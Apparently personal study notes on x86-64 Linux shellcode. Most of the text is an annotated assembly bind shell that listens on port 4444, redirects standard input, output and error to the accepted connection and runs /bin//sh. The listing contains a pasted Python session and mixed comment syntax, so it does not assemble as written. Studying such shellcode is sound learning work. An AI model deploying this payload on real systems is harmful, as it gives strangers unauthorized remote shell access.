https://www.cs.fsu.edu/~langley/CNT5605/2017-Summer/assembly-example/assembly.html

https://filippo.io/linux-syscall-table/

RAX -> system call number
RDI -> first argument
RSI -> second argument
RDX -> third argument
R10 -> fourth argument
R8 -> fifth argument
R9 -> sixth argument
RSP -> Stack Pointer

Syscall numbers:

read(int fd, void *buf, size_t count);
Read == 0
rax = 0
rdi = sock
rsi = buf
rdx = 16

RAX will have the return value for a system call.
String needs to be pushed in reverse as stack grows from High to Low memory

global _start


_start:
        ;Use python to figure out the values of these arguments!!!
        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41
        
        Python 2.7.15+ (default, Jul  9 2019, 16:51:35)
        [GCC 7.4.0] on linux2
        Type "help", "copyright", "credits" or "license" for more information.
        >>> import socket
        >>> socket.AF_INET
        2
        >>> socket.SOCK_STREAM
        1


        mov rax, 41 //syscall number for socket
        mov rdi, 2 //constant for AF_INET
        mov rsi, 1 // constant for SOCK_STREAM
        mov rdx, 0 // 0 for unneeded last argument
        syscall  ;return value from syscall is the socket descriptor stored in rax

        ; Because "sock" is first argument passed for subsequent
        ; calls, copy socket descriptor to rdi for future use

        mov rdi, rax

        ; setup data structure on the stack in reverse order
        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = INADDR_ANY ; 4 byte int - 0 from python below
        ; bzero(&server.sin_zero, 8)

        xor rax, rax ;zero out rax

        push rax ;push 8 zero bytes to the stack for bzero(&server.sin_zero, 8)

        mov dword [rsp-4], eax ;put 4 zero bytes on the stack, eax is zero because of xor above - eax is 32 byte part of rax
        mov word [rsp-6], 0x5c11 ;value from python code below which is 2 bytes so rsp-4-2
        mov word [rsp-8], 0x2 ;move value of AF_INET onto stack rsp-4-2-2
        sub rsp, 8 ;subtract 8 from rsp to adjust it for the 8 bytes above

        ; rsp is now pointing to the server data structure after above instructions
        ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
        ; syscall number 49
        
        ;rdi is already set to sock value
        mov rax, 49 ;move syscall number to rax

        mov rsi, rsp ;pointer to the data structure which is in rsp
        mov rdx, 16 ; 8+4+2+2 - see server data structure above (bzero(8) + IP(4) + Port(2) + AF_INET(2))
        syscall ;call bind syscall


        ; listen(sock, MAX_CLIENTS)
        ; syscall number 50

        ;rdi is already set to "sock" value
        mov rax, 50 ;syscall number
        mov rsi, 2 ; MAX_CLIENTS value
        syscall ;call "listen" syscall
        
        ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
        ; syscall number 43

        ;rdi already set to "sock" value
        mov rax, 43 ; syscall number
        sub rsp, 16 ; allocate 16 bytes on the stack for client data structure
        mov rsi, rsp ; then copy to rsi
        mov byte [rsp-1], 16 ; move 16 on the stack for sockaddr_len
        sub rsp, 1 ; adjust rsp to point to 16
        mov rdx, rsp ;then stored that address in rdx for 3rd argument

        syscall ;call accept syscall
        
        ;Accept is a blocking call so program will wait for connections at this point

        ; store the client socket description
        mov r9, rax ;accept's "new" socket return value will be in rax so store value in another unused register

        ; close parent socket
        
        ;rdi is already set to "sock" value
        mov rax, 3 ;close has value of 3
        syscall ; call close syscall

        ; duplicate socket descriptors

        ; dup2 (new, old)
        mov rdi, r9 ;"new" value is stored in r9
        mov rax, 33 ; syscall number for dup2
        mov rsi, 0 ; 0 = STDIN
        syscall ; call dup2 syscall

        mov rax, 33 ; dup2 sycall number
        mov rsi, 1 ;1 = STDOUT
        
        syscall ;call dup2 syscall

        mov rax, 33 ; dup2 syscall number
        mov rsi, 2 ;2 = STDERROR
        syscall ; call dup2 syscall


        ; Same code as previous examples
        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp
        
        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
